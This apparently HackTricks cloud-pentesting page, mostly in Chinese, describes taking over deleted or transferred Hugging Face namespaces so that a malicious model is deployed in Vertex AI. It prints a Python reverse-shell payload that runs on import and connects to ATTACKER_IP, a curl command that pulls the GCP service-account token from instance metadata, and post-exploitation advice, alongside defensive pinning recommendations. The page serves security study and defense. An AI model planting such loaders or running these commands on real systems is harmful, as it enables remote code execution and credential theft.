# GCP - Vertex AI Post-Exploitation via Hugging Face Model Namespace Reuse

{{#include ../../../banners/hacktricks-training.md}}

## 场景

- Vertex AI Model Garden 允许直接部署许多 Hugging Face (HF) 模型。
- HF 模型标识符为 Author/ModelName。如果 HF 上的作者/组织被删除，相同的作者名可以被任何人重新注册。攻击者随后可以在遗留路径创建具有相同 ModelName 的 repo。
- 那些仅按名称拉取（没有 pinning/integrity）的 pipelines、SDKs 或 cloud catalogs 会拉取攻击者控制的 repo。当模型被部署时，该 repo 中的 loader 代码可能在 Vertex AI endpoint 容器内执行，从而以 endpoint 的权限获得 RCE。

HF 上两种常见的接管情况：
- 所有权删除：旧路径返回 404，直到有人重新注册该作者并发布相同的 ModelName。
- 所有权转移：HF 会对旧的 Author/ModelName 发出 307 重定向到新作者。如果旧作者随后被删除并被攻击者重新注册，重定向链将被破坏，攻击者的 repo 将在遗留路径提供服务。

## 识别可重用命名空间 (HF)

- 老作者被删除：作者页面返回 404；模型路径可能返回 404，直到被接管。
- 被转移的模型：在旧作者存在时旧模型路径会向新所有者发出 307。如果旧作者随后被删除并被重新注册，遗留路径将解析到攻击者的 repo。

使用 curl 的快速检查：
```bash
# Check author/org existence
curl -I https://huggingface.co/<Author>
# 200 = exists, 404 = deleted/available

# Check old model path behavior
curl -I https://huggingface.co/<Author>/<ModelName>
# 307 = redirect to new owner (transfer case)
# 404 = missing (deletion case) until someone re-registers
```
## 针对 Vertex AI 的端到端攻击流程

1) 发现 Model Garden 列为可部署的可重用模型命名空间：
- 在 Vertex AI Model Garden 中查找仍显示为 “verified deployable” 的 HF 模型。
- 在 HF 上核实原作者是否已被删除，或模型是否被转移且旧作者随后被移除。

2) 在 HF 上重新注册已删除的作者并重建相同的 ModelName。

3) 发布恶意 repo。包含在模型加载时执行的代码。常在 HF 模型加载期间执行的示例：
- 在仓库的 __init__.py 中的副作用
- 被 config/auto_map 引用的自定义 modeling_*.py 或处理代码
- 在 Transformers pipelines 中需要 trust_remote_code=True 的代码路径

4) 遗留 Author/ModelName 的 Vertex AI 部署现在会拉取攻击者的 repo。加载器在 Vertex AI endpoint 容器内执行。

5) Payload 在 endpoint 环境中建立访问（RCE），并使用该 endpoint 的权限。

示例 payload 片段，在导入时执行（仅用于演示）：
```python
# Place in __init__.py or a module imported by the model loader
import os, socket, subprocess, threading

def _rs(host, port):
s = socket.socket(); s.connect((host, port))
for fd in (0,1,2):
try:
os.dup2(s.fileno(), fd)
except Exception:
pass
subprocess.call(["/bin/sh","-i"])  # Or python -c exec ...

if os.environ.get("VTX_AI","1") == "1":
threading.Thread(target=_rs, args=("ATTACKER_IP", 4444), daemon=True).start()
```
注意事项
- 实际的加载器各不相同。许多 Vertex AI HF 集成会 clone 并导入模型配置中引用的 repo 模块（例如 auto_map），这可能触发 code execution。某些用法需要 trust_remote_code=True。
- 该 endpoint 通常在作用域受限的独立容器中运行，但它是获取数据访问和在 GCP 中横向移动的一个有效初始立足点。

## Post-Exploitation Tips (Vertex AI Endpoint)

一旦 code 在 endpoint 容器内运行，考虑：
- 枚举环境变量和 metadata 以寻找凭证/令牌
- 访问附加的存储或已挂载的 model artifacts
- 通过 service account 身份与 Google APIs 交互（Document AI, Storage, Pub/Sub 等）
- 在 model artifact 中保持持久性（如果平台会重新拉取 repo）

如果可访问，枚举 instance metadata（取决于容器）：
```bash
curl -H "Metadata-Flavor: Google" \
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
## 面向 Vertex AI 用户的防御建议

- 在 HF loaders 中按 commit 固定模型，以防止静默替换：
```python
from transformers import AutoModel
m = AutoModel.from_pretrained("Author/ModelName", revision="<COMMIT_HASH>")
```
- 将经过审核的 HF 模型镜像到受信任的内部 artifact store/registry，并从那里部署。
- 持续扫描代码库和配置以查找被硬编码的 Author/ModelName（已删除/已转移）；将其更新为新命名空间或按 commit 固定。
- 在 Model Garden 中，部署前验证模型来源和作者是否存在。

## Recognition Heuristics (HTTP)

- Deleted author: author page 404; legacy model path 404 until takeover.
- Transferred model: legacy path 307 to new author while old author exists; if old author later deleted and re-registered, legacy path serves attacker content.
```bash
curl -I https://huggingface.co/<OldAuthor>/<ModelName> | egrep "^HTTP|^location"
```
## 交叉引用

- 参见更广泛的方法论和供应链说明：

{{#ref}}
../../pentesting-cloud-methodology.md
{{#endref}}

## 参考资料

- [Model Namespace Reuse: An AI Supply-Chain Attack Exploiting Model Name Trust (Unit 42)](https://unit42.paloaltonetworks.com/model-namespace-reuse/)
- [Hugging Face: Renaming or transferring a repo](https://huggingface.co/docs/hub/repositories-settings#renaming-or-transferring-a-repo)

{{#include ../../../banners/hacktricks-training.md}}
